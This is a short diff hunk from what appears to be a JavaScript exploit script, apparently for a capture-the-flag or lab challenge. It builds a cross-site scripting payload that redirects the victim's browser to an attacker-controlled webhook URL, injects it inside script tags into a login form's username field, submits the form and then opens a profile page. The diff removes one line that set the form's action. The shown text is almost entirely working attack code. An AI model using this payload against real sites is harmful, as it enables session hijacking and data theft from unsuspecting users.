@@ -28,7 +28,6 @@ setTimeout(() => {
 document.location = "${WEBHOOK}?open";
 `;
   document.getElementById("username").value = `<script>${payload}</script>`;
-  document.getElementById("login").action = LOGIN;
   document.getElementById("login").submit();
 
   setTimeout(() => openProfile(), 2000);
